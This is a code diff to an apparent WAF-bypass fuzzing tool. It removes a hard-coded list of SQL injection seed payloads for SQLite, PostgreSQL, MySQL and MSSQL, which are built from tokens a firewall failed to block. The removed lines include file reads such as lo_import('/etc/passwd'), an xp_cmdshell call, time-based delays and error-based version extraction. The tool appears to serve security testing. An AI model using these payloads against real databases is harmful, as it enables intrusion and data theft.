@@ -281,109 +281,18 @@ def _gap_token_names(gaps: list[TokenProbe]) -> set[str]:
 def generate_exploit_seeds(engine: str, gaps: list[TokenProbe]) -> list[str]:
     """Build exploit seed payloads using only undetected tokens.
 
-    These are syntactically valid (or near-valid) SQL for the target dialect,
-    composed from tokens the WAF did not block. They serve as high-quality
-    starting seeds for WAFFEN's search engine.
+    Delegates to reconstruct.py's template builders (the single source of
+    truth for per-engine exploit templates) and extracts the pattern strings.
     """
     names = _gap_token_names(gaps)
     if not names:
         return []
-
-    seeds: list[str] = []
-
-    if engine == "sqlite":
-        if "GLOB" in names:
-            seeds.append("' GLOB '*")
-            seeds.append("' GLOB '*' GLOB '")
-        if "GLOB" in names and "COLLATE" in names:
-            seeds.append("' COLLATE NOCASE GLOB '*' GLOB '")
-        if "ISNULL" in names:
-            seeds.append("' ISNULL GLOB '*' GLOB '")
-        if "NOTNULL" in names:
-            seeds.append("' NOTNULL GLOB '*' GLOB '")
-        if "iif" in names:
-            seeds.append("' GLOB iif(1,'*','') GLOB '")
-        if "typeof" in names:
-            seeds.append("' GLOB typeof('*') GLOB '")
-        if "nullif" in names:
-            seeds.append("' GLOB nullif('*','') GLOB '")
-        if "hex" in names:
-            seeds.append("hex(randomblob(100))")
-        if "sqlite_version" in names:
-            seeds.append("sqlite_version()")
-        if "quote" in names:
-            seeds.append("' GLOB quote('*') GLOB '")
-        if "MATCH" in names:
-            seeds.append("' MATCH '*")
-        if "ESCAPE" in names:
-            seeds.append("' ESCAPE '' GLOB '*' GLOB '")
-        if "json_extract" in names:
-            seeds.append("json_extract('{\"a\":1}','$.a')")
-
-    elif engine == "postgresql":
-        if "ILIKE" in names:
-            seeds.append("' ILIKE '%")
-        if "SIMILAR TO" in names:
-            seeds.append("' SIMILAR TO '%")
-        if "~" in names:
-            seeds.append("' ~ '.*")
-        if "::" in names:
-            seeds.append("'1'::int")
-        if "pg_sleep" in names:
-            seeds.append("pg_sleep(5)")
-        if "pg_read_file" in names:
-            seeds.append("pg_read_file('/etc/hostname')")
-        if "current_setting" in names:
-            seeds.append("current_setting('server_version')")
-        if "string_agg" in names:
-            seeds.append("string_agg(table_name,',')")
-        if "generate_series" in names:
-            seeds.append("generate_series(1,10)")
-        if "lo_import" in names:
-            seeds.append("lo_import('/etc/passwd')")
-
-    elif engine == "mysql":
-        if "RLIKE" in names:
-            seeds.append("' RLIKE '.*")
-        if ":=" in names:
-            seeds.append("@a:=1")
-        if "BENCHMARK" in names:
-            seeds.append("BENCHMARK(5000000,SHA1('test'))")
-        if "LOAD_FILE" in names:
-            seeds.append("LOAD_FILE('/etc/hostname')")
-        if "@@version" in names:
-            seeds.append("@@version")
-        if "@@datadir" in names:
-            seeds.append("@@datadir")
-        if "EXTRACTVALUE" in names:
-            seeds.append("EXTRACTVALUE(1,CONCAT(0x7e,version()))")
-        if "UPDATEXML" in names:
-            seeds.append("UPDATEXML(1,CONCAT(0x7e,version()),1)")
-        if "EXP" in names:
-            seeds.append("EXP(~(SELECT*FROM(SELECT version())x))")
-        if "JSON_EXTRACT" in names:
-            seeds.append("JSON_EXTRACT('{\"a\":1}','$.a')")
-        if "SOUNDS LIKE" in names:
-            seeds.append("' SOUNDS LIKE '")
-
-    elif engine == "mssql":
-        if "WAITFOR" in names:
-            seeds.append("WAITFOR DELAY '0:0:5'")
-        if "OPENROWSET" in names:
-            seeds.append("OPENROWSET('SQLOLEDB','server=;','SELECT 1')")
-        if "xp_cmdshell" in names:
-            seeds.append("xp_cmdshell('whoami')")
-        if "IIF" in names:
-            seeds.append("IIF(1=1,1,0)")
-        if "STUFF" in names:
-            seeds.append("STUFF((SELECT 1),1,0,'')")
-        if "STRING_AGG" in names:
-            seeds.append("STRING_AGG(name,',')")
-        if "SERVERPROPERTY" in names:
-            seeds.append("SERVERPROPERTY('ProductVersion')")
-        if "DB_NAME" in names:
-            seeds.append("DB_NAME()")
-        if "HOST_NAME" in names:
-            seeds.append("HOST_NAME()")
-
-    return seeds
+    try:
+        from .reconstruct import _ENGINE_BUILDERS, expand_all
+        builder = _ENGINE_BUILDERS.get(engine)
+        if builder:
+            templates = builder(names)
+            return [t.pattern for t in templates]
+    except ImportError:
+        pass
+    return []
